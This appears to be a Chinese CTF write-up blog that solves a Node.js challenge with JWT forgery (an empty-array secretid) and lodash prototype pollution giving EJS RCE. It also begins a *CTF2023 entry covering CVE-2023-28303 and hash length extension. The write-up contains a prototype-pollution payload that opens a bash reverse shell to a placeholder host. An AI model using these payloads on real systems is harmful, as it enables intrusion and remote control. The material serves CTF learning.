<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'session'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token function">randomize</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> token<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login error.'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                <span class="token literal-property property">username</span><span class="token operator">:</span> username<span class="token punctuation">,</span>
                <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span>
            res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login error.'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Username existed."</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Token: "</span> <span class="token operator">+</span> token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">827</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在&#x2F;register下注册后123：123，会给一个token<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY5MzU4NDM0NH0.i1rjUzM3MYuzBMzz3sW023l-mt4Sd6VAHkdS5UxYF3g</code><br>登录时需要用户名+密码+token。但是我们注册的用户不能&#x2F;update。<br><img src="https://img-blog.csdnimg.cn/147fab8f0404456fb686b4acd0d9ec5d.png" alt="1"><br>这也就照应了这部分逻辑</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果用户名是nss后面才有出flag的可能。但是nss用户已经存在了，说明这里需要我们登录nss用户。<br>看一下token值<br><img src="https://img-blog.csdnimg.cn/86cbadda16d549b494ecc4c5c66dd2c8.png" alt="2"><br>这里的HS256也就是HMAC算法</p>
<blockquote>
<p>为了防止黑客通过彩虹表根据哈希值反推原始口令，在计算哈希的时候增加了一个salt来使得相同的输入也能得到不同的哈希值，增大了黑客破解哈希的难度。<br>如果salt是我们自己随机生成的，通常我们在计算MD5时采用<code>md5(message+salt)</code>。实际上就是把salt看做一个口令，加salt的哈希就是：计算一段message的哈希时，根据不同口令计算出不同的哈希。要验证哈希值，必须同时提供正确的口令。<br>这实际上就是Hmac算法：Keyed-Hashing for Message Authentication。它通过一个标准算法，在计算哈希的过程中，把key混入计算过程中。<br>和我们自定义的加salt算法不同，Hmac算法针对所有哈希算法都通用，无论是MD5还是SHA-1。采用Hmac替代我们自己的salt算法，可以使程序算法更标准化，也更安全。</p>
</blockquote>
<p>内容中有时间戳（时间戳代表这个jwt许可签发的时间，过了一段时间签名就会失效，在jwt.verify的时候就会验证这个iat来判断jwt的有效性。）<br>&#x2F;login可以看出jwt该如何伪造：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>secret哪来的呢？</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sid又是哪来的呢？</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sid就是我们传入jwt里面的secretid，后面验证了sid不能为null（空）和undefined，那也就不能通过直接置空sid来绕过，secret是直接通过secret[sid]获取，那么这个sid就直接传入一个<code>[]</code>，就可以导致secret为空，那么jwt直接指定空算法也就可以通过验证。<br><img src="https://img-blog.csdnimg.cn/28f08cdf50bb4c89a25f55d92309001b.png" alt="5"><br>然后成功登录nss。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后这里<code>lodash.merge</code>有个ejs原型链污染rce，使用下面这个进行反弹shell。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
    <span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">"client"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string-property property">"escapeFunction"</span><span class="token operator">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/x.x.x.x/4444 0>&amp;1\"');"</span><span class="token punctuation">,</span><span class="token string-property property">"compileDebug"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/d7cdae347d354d2095b299a191781c92.png" alt="1"><br>然后在vps开启监听后访问&#x2F;home后shell即可反弹到vps上。<br><img src="https://img-blog.csdnimg.cn/d9aca416514840d5a8bda2d576dd09c7.png" alt="6"><br>查看环境变量得到flag。<br><img src="https://img-blog.csdnimg.cn/b13276b67e4c413d9828703a218e0f81.png" alt="6"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>资料<br><a href="https://xz.aliyun.com/t/6776#toc-8">攻击JWT的一些方法</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183198304823296">hmac</a></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>(六星)CTF2023</title>
    <url>/2023/07/30/(%E5%85%AD%E6%98%9F)CTF2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<p><img src="https://img-blog.csdnimg.cn/471de38845874a84a1a1673a28a23118.jpeg#pic_center" alt="*CTF2023"></p>
<p><img src="https://img-blog.csdnimg.cn/326ea0d2418342a985041a588461e760.png" alt="1"></p>
<h2 id="MISC-snippingTools"><a href="#MISC-snippingTools" class="headerlink" title="MISC-snippingTools"></a>MISC-snippingTools</h2><p>cve-2023-28303<br>找到一个exp</p>
<p><a href="https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02">https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02</a></p>
<p>利用脚本运行，题目中说截取整个屏幕那也就是2560*1600</p>
<p>运行脚本</p>
<blockquote>
<p>python 1.py 2560 1600 1.png 2.png</p>
</blockquote>
<p>得到2.png图片</p>
<p>flag看不清利用Stegsolve.jar矫正</p>
<p><img src="https://img-blog.csdnimg.cn/e8ee345b4f5546ba8ea1ef6bc526e853.png#pic_center" alt="1"></p>
<p>*ctf{cve-2023-28303-windows-snipping-tool-is-not-secure-4E9019139D9A}</p>
<h2 id="WEB-jwt2struts"><a href="#WEB-jwt2struts" class="headerlink" title="WEB-jwt2struts"></a>WEB-jwt2struts</h2><p>考察的知识点：</p>
<blockquote>
<p>JWT+HASH扩展攻击+struct2漏洞</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/dd019c9dd6014989aa2bfce816280f5e.png" alt="1"></p>
<p>将access_token中的解密后可知用户为user，要改为admin，就需要知道key。<br><img src="https://img-blog.csdnimg.cn/2493b913c66145efb9947b91334c386c.png" alt="2"><br>查看源码之后发现路径<code>JWT_key.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"./secret_key.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"./salt.php"</span><span class="token punctuation">;</span>
<span class="token comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span>
<span class="token comment">//md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df</span>
@<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
